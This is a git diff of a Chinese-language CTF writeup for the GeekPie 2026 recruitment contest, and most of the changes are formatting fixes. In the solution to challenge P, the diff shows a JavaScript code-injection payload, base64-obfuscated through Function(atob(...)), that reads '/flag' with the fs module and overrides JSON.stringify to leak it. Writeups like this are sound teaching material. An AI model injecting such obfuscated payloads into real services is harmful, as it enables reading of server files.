@@ -8,7 +8,7 @@ permalink: /blog/geekpie-26s-writeup/
 excerpt: 记录 GeekPie 2026 招新赛所出6题的题解及出题思路。
 ---
 
-本文为 Hello GeekPie_ 2026 招新赛 **C D M N P T** 题目的题解以及出题人想说的一些思路和想法，也欢迎大家在 Hydro OJ 和本文评论区发表自己的题解。
+本文为 Hello GeekPie\_ 2026 招新赛 **C D M N P T** 题目的题解以及出题人想说的一些思路和想法，也欢迎大家在 Hydro OJ 和本文评论区发表自己的题解。
 
 ## C Minor Update
 
@@ -28,7 +28,7 @@ excerpt: 记录 GeekPie 2026 招新赛所出6题的题解及出题思路。
 
 ![](https://download.talexck.com/download/a0d72a1e-f187-4631-9144-3cfcd9edd127)
 
-没错，这是 Morse Code. 找一个能解码的网站，比如[这个](https://gchq.github.io/CyberChef/#recipe=From_Morse_Code('Space','Line%20feed')&input=LS0uIC0uLSAuLS0uIC0tLiAuIC4gLS4tIC4tLS4gLi4gLiAuLi0tLi0gLS4tLiAuLiAuLSAuLi0tLi0gLi4tLS0gLS0tLS0gLi4tLS0gLS4uLi4gLi4tLS4tIC4tLi4gLi0uLiAtLS0gLS4tLi0t)，我们就能得到 flag: `GKP{GEEKPIE_CIA_2026_LLO!}`
+没错，这是 Morse Code. 找一个能解码的网站，比如[这个](<https://gchq.github.io/CyberChef/#recipe=From_Morse_Code('Space','Line%20feed')&input=LS0uIC0uLSAuLS0uIC0tLiAuIC4gLS4tIC4tLS4gLi4gLiAuLi0tLi0gLS4tLiAuLiAuLSAuLi0tLi0gLi4tLS0gLS0tLS0gLi4tLS0gLS4uLi4gLi4tLS4tIC4tLi4gLi0uLiAtLS0gLS4tLi0t>)，我们就能得到 flag: `GKP{GEEKPIE_CIA_2026_LLO!}`
 
 ## D Tank 1990 ? NO ! Tank 2026
 
@@ -67,14 +67,14 @@ if (rax_2 == 0 && rax_4 == 0)
     char var_58[0x48]
     char rax_5 = factorialDecimal(&var_9c, &var_58, 0x40)
     int32_t rax_6
-    
+
     if (rax_5 != 0)
         rax_6 = strcmp(&var_98, &var_58)
-    
+
     int32_t rax_7
-    
+
     rax_7 = rax_5 == 0 || rax_6 != 0 ? 0 : 1
-    
+
     result = rax_7 & 1
 else
     result = 0
@@ -106,7 +106,7 @@ docker run --rm \
 
 访问：http://127.0.0.1:8080/
 
-# M Hello SHTechCraft
+## M Hello SHTechCraft
 
 > 小明是一位 Minecraft 玩家，今天他闲来无事，配置了一个 Minecraft 26.2 的 Fabric 整合包。但当他兴致勃勃地启动 Minecraft 后，发现并没有合适的服务器，你能给他提供一个吗？
 >
@@ -212,7 +212,7 @@ docker run --rm \
 
 注意：此小明和比赛期间的小明有细微的差别，但不影响测试
 
-# N CHANGE TO OPENCODE NOW !!!
+## N CHANGE TO OPENCODE NOW !!!
 
 > 根据最新 [OpenBench](https://openbench.run/openbench/) 数据：
 >
@@ -224,8 +224,6 @@ docker run --rm \
 >
 > ![](https://download.talexck.com/download/ceb48571-a64b-4e0c-8395-255af0bdd12a)
 >
-> 
->
 > 经过严谨的、客观的、绝对没有任何利益相关的分析，我们得出了唯一合理的结论：
 >
 > **你还在用 Codex？**
@@ -233,8 +231,6 @@ docker run --rm \
 > 为了保护你的 Token、钱包，以及所剩无几的理智，我们强烈建议：
 >
 > # CHANGE TO OPENCODE NOW !!!
->
-> 
 >
 > **命令行！更简洁！**
 >
@@ -254,7 +250,6 @@ docker run --rm \
 > ## 备注
 >
 > 你可以下载[题目附件](https://download.talexck.com/download/22f004ce-93b5-4635-b753-5f08e0c97282)
->
 
 ### Flag 1
 
@@ -364,11 +359,11 @@ docker run --rm \
 
 注意：此镜像与比赛期间镜像有细微差别，但不影响相关测试
 
-# P “我们来玩海龟汤吧，我会回答是或不是”
+## P “我们来玩海龟汤吧，我会回答是或不是”
 
 > **“我们来玩海龟汤吧，我会回答是或不是”**
 >
-> “我是在做 GeekPie_ 招新赛题吗”
+> “我是在做 GeekPie\_ 招新赛题吗”
 >
 > **“是”**
 >
@@ -436,14 +431,14 @@ docker run --rm \
 接下来要考虑的是如何能够让 flag 显示出来。有两种思路，题面中说此题是使用 Hono 框架构建的，而在其文档中，能找到 [API - Context - Json()](https://hono.dev/docs/api/context#json)，看到这样的代码：
 
 ```javascript
-app.get('/api', (c) => {
-  return c.json({ message: 'Hello!' })
-})
+app.get("/api", (c) => {
+  return c.json({ message: "Hello!" });
+});
 ```
 
 而在 Github Repo 中，找到对应的实现：
 
-```javascript
+````javascript
 /**
    * `.json()` can render JSON as `Content-Type:application/json`.
    *
@@ -470,23 +465,27 @@ app.get('/api', (c) => {
       setDefaultContentType('application/json', headers)
     ) /* eslint-disable @typescript-eslint/no-explicit-any */ as any
   }
-```
+````
 
 能想到全局替换函数 `JSON.stringify()` 并让这个函数返回 flag.
 
 于是我们可以构造这样的代码：
 
 ```javascript
-ü=0//
-const f = process.getBuiltinModule('fs').readFileSync('/flag', 'utf8').trim();
+ü = 0; //
+const f = process.getBuiltinModule("fs").readFileSync("/flag", "utf8").trim();
 JSON.stringify = () => f;
-return true;//?
+return true; //?
 ```
 
 对应的 payload 是：
 
 ```javascript
-Function(atob(/D0wLy8KY29uc3QgZiA9IHByb2Nlc3MuZ2V0QnVpbHRpbk1vZHVsZSgnZnMnKS5yZWFkRmlsZVN5bmMoJy9mbGFnJywgJ3V0ZjgnKS50cmltKCk7CkpTT04uc3RyaW5naWZ5ID0gKCkgPT4gZjsKcmV0dXJuIHRydWU7Ly8/))()
+Function(
+  atob(
+    /D0wLy8KY29uc3QgZiA9IHByb2Nlc3MuZ2V0QnVpbHRpbk1vZHVsZSgnZnMnKS5yZWFkRmlsZVN5bmMoJy9mbGFnJywgJ3V0ZjgnKS50cmltKCk7CkpTT04uc3RyaW5naWZ5ID0gKCkgPT4gZjsKcmV0dXJuIHRydWU7Ly8/,
+  ),
+)();
 ```
 
 向 `/api` 发送对应请求，我们可以得到 flag.
@@ -508,6 +507,6 @@ docker run --rm \
 
 访问：http://127.0.0.1:3000/blog/simple-javascript/
 
-# T
+## T
 
 本题题目与题解请在 OJ 上查看，不在此处公开。
